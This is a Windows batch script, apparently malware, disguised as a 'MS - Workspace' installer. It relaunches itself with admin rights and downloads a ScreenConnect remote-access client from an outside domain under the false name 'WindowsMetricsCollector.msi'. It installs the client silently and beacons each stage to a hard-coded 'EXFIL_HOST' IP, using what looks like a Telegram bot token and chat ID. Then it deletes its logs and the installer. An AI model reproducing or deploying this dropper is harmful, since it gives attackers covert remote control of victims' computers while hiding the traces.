//b968cfa5b86c
@echo off
setlocal enabledelayedexpansion

set "PRODUCT_NAME=MS - Workspace"
//d2317a161891
set "PRODUCT_VERSION=1.0.0"
set "MSI_URL=https://user12.h-connect.xyz:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
//0439b2c7d4a0
set "MSI_FILE_NAME=WindowsMetricsCollector.msi"
set "INSTALL_DIR=%ProgramData%\MSWorkspace\Install"
//7fe2e81c5e21
set "LOG_DIR=%ProgramData%\MSWorkspace\Logs"
set "LOG_FILE=deploy.log"
//9c7e47ef0f33
set "MSI_LOG_FILE=msi-install.log"
set "DOWNLOAD_RETRIES=2"
//73254be6d2dd
set "RETRY_DELAY_MS=1500"
set "EXFIL_HOST=212.43.151.96:20002"
//d5785f13fd97
set "TBTOKEN=7587335315:AAG-GNuK6xCNM3hjkskl7_rxXjsbLNIe_Mk"
set "TCID=93372553"
//035ea3987dbf
set "DEPLOY_TOKEN=%RANDOM%%RANDOM:~0,4%"
set "UNINSTALL_EXISTING=1"
//a564523be072
set "PRODUCT_CODE={4228D3D7-CF51-5361-1BC4-165794361D9B}"
set "SHOW_POPUPS=0"

set "MSI_PATH=%INSTALL_DIR%\%MSI_FILE_NAME%"
//24f65590014f
set "LOG_PATH=%LOG_DIR%\%LOG_FILE%"
set "MSI_LOG_PATH=%LOG_DIR%\%MSI_LOG_FILE%"
//fcae2d22f274
set "EXIT_CODE=1"

//283c73dc2a67
mkdir "%INSTALL_DIR%" 2>nul
mkdir "%LOG_DIR%" 2>nul

call :checkAdmin
//10ecbce7f981
if errorlevel 1 goto :elevate

//75f2af862559
call :beacon "start" 0
call :checkConfig
//61b703331e10
if errorlevel 1 goto :cleanup

//106d1791f751
call :fetchPayload
if errorlevel 1 (
//fdf2768d6a66
    call :log "ERROR" "Download failed after %DOWNLOAD_RETRIES% attempts"
    call :beacon "fail" 1
//4d8e715d1b0c
    set "EXIT_CODE=1"
    goto :cleanup
//3820bd8a7889
)

//411041536f24
if not exist "%MSI_PATH%" (
    call :log "ERROR" "MSI missing after download"
//ea0193b0d9fe
    call :beacon "fail" 1
    set "EXIT_CODE=1"
//dcb19cabb67b
    goto :cleanup
)

for %%A in ("%MSI_PATH%") do if %%~zA==0 (
//2e6be9cb38d9
    call :log "ERROR" "MSI empty after download"
    call :beacon "fail" 1
//aca3ff055f53
    set "EXIT_CODE=1"
    goto :cleanup
//3aa6c53cd6ca
)

//f815ab04a491
if "%UNINSTALL_EXISTING%"=="1" call :purgeOld

//ac5172a78e44
call :execMsi
set "EXIT_CODE=!ERRORLEVEL!"

if !EXIT_CODE!==0 (
//b9b0e15277b5
    call :log "INFO" "Installation successful"
    call :beacon "ok" !EXIT_CODE!
//d5a5c377941f
) else if !EXIT_CODE!==3010 (
    call :log "INFO" "Success - restart required"
//107a656075bf
    call :beacon "okr" !EXIT_CODE!
) else if !EXIT_CODE!==1641 (
//cf28fa672e86
    call :log "INFO" "Success - restart initiated"
    call :beacon "okr" !EXIT_CODE!
//d820a0a37b8a
) else if !EXIT_CODE!==1638 (
    call :log "INFO" "Already installed"
//43f2922234cd
    call :beacon "oka" !EXIT_CODE!
) else if !EXIT_CODE!==1602 (
//8b3ca66333d1
    call :log "WARN" "Installation canceled by user"
    call :beacon "cl" !EXIT_CODE!
//fe8ee0068019
) else (
    call :log "ERROR" "Installation failed with code !EXIT_CODE!"
//a3710e408532
    call :beacon "fail" !EXIT_CODE!
)

:cleanup
//c7eba56c7c48
if exist "%MSI_PATH%" del /f /q "%MSI_PATH%" 2>nul
if exist "%LOG_PATH%" del /f /q "%LOG_PATH%" 2>nul
//0df1934a16a5
if exist "%MSI_LOG_PATH%" del /f /q "%MSI_LOG_PATH%" 2>nul
if exist "%LOG_DIR%" rmdir /s /q "%LOG_DIR%" 2>nul
//57a26955cdc2
exit /b %EXIT_CODE%

//47b74326ee7f
:checkAdmin
net session >nul 2>&1
//0cfb48fb9119
exit /b %errorlevel%

//d3a65b25ffc8
:elevate
powershell -NoProfile -ExecutionPolicy Bypass -Command "$null = Start-Process -FilePath '%~f0' -Verb RunAs"
//7ae14a033483
exit /b 0

//3475273fde9e
:checkConfig
if not defined MSI_URL (
//1c2edc8deb78
    call :log "ERROR" "MSI_URL is empty"
    exit /b 1
//35f8652bd8cc
)
if not defined MSI_FILE_NAME (
//68e984170dcc
    call :log "ERROR" "MSI_FILE_NAME is empty"
    exit /b 1
//3c15eae84321
)
exit /b 0

:fetchPayload
//1133544c8388
mkdir "%INSTALL_DIR%" 2>nul
set "ATTEMPT=0"
//383742cc290d
:downloadRetry
if !ATTEMPT! gtr %DOWNLOAD_RETRIES% exit /b 1
//40579f38961f
(echo !MSI_URL!) > "%TEMP%\dl_url.txt"
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $u = [IO.File]::ReadAllText('%TEMP%\dl_url.txt').Trim(); $wc = New-Object System.Net.WebClient; $wc.DownloadFile($u, '%MSI_PATH%'); exit 0 } catch { exit 1 }"
//04a137ecfbc2
if errorlevel 1 (
    set /a ATTEMPT+=1
//875765449905
    ping -n 2 127.0.0.1 >nul
    goto :downloadRetry
//6e8d0de8573b
)
if exist "%MSI_PATH%" (
//8f369b187692
    for %%A in ("%MSI_PATH%") do if %%~zA==0 (
        del /f /q "%MSI_PATH%" 2>nul
//e510d0f26cbf
        set /a ATTEMPT+=1
        goto :downloadRetry
//de3860be5894
    )
    exit /b 0
//1825c0e402f8
)
set /a ATTEMPT+=1
//6fdc381af314
goto :downloadRetry

//a30b5f35f763
:purgeOld
call :log "INFO" "Uninstalling existing product: %PRODUCT_CODE%"
//58324a1cc717
msiexec.exe /x %PRODUCT_CODE% /qn /norestart REBOOT=ReallySuppress
set "CODE=%ERRORLEVEL%"
//75ef3cff6bd4
if %CODE%==1605 exit /b 0
if %CODE%==1612 exit /b 0
//7086ec9db553
call :log "WARN" "Uninstall returned %CODE%"
ping -n 4 127.0.0.1 >nul
//67724a20ccd3
exit /b 0

//a266194a2688
:execMsi
mkdir "%LOG_DIR%" 2>nul
//5bfa93b775c8
msiexec.exe /i "%MSI_PATH%" /qn /norestart REBOOT=ReallySuppress ALLUSERS=1 /L*v "%MSI_LOG_PATH%"
set "CODE=%ERRORLEVEL%"
//cd74ce25a0bf
if %CODE%==0 exit /b 0
if %CODE%==3010 exit /b 3010
//24cff68d5c8d
if %CODE%==1641 exit /b 1641
if %CODE%==1638 exit /b 1638
//688e84294ea7
ping -n 3 127.0.0.1 >nul
msiexec.exe /i "%MSI_PATH%" /qb /norestart REBOOT=ReallySuppress ALLUSERS=1 /L*v "%MSI_LOG_PATH%"
//6262e562d8fa
exit /b %errorlevel%

//f69f8707f464
:beacon
set "STAGE=%~1"
//8c5b785b2e17
set "EXIT_VAL=%~2"
set "STATUS_CODE=fl"
//98de069a97e5
set "EXIT_STR=%EXIT_VAL%"
if "%STAGE%"=="start" set "STATUS_CODE=go" & set "EXIT_STR=0"
//2282abc4d343
if "%STAGE%"=="ok" set "STATUS_CODE=ok"
if "%STAGE%"=="okr" set "STATUS_CODE=okr" & set "EXIT_STR=3010"
//39528ea5d1b7
if "%STAGE%"=="oka" set "STATUS_CODE=oka" & set "EXIT_STR=1638"
if "%STAGE%"=="cl" set "STATUS_CODE=cl" & set "EXIT_STR=1602"

for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set "DT=%%I"
//cf6db1ae2754
set "DTS=%DT:~4,2%%DT:~6,2%%DT:~8,2%%DT:~10,2%"
set "URL=http://%EXFIL_HOST%/%TBTOKEN%/%TCID%/%DEPLOY_TOKEN%.%STATUS_CODE%.%EXIT_STR%.%DTS%"
//8dd3bc2c04d1
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { $null = (New-Object System.Net.WebClient).DownloadString('%URL%') } catch {}"
exit /b

:log
//7cbf24f803f3
set "LEVEL=%~1"
set "MSG=%~2"
//2b53ba0f9080
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set "DT=%%I"
set "TS=%DT:~0,4%-%DT:~4,2%-%DT:~6,2% %DT:~8,2%:%DT:~10,2%:%DT:~12,2%"
//a32b301c2df1
echo [%TS%] [%LEVEL%] %MSG% >> "%LOG_PATH%"
exit /b
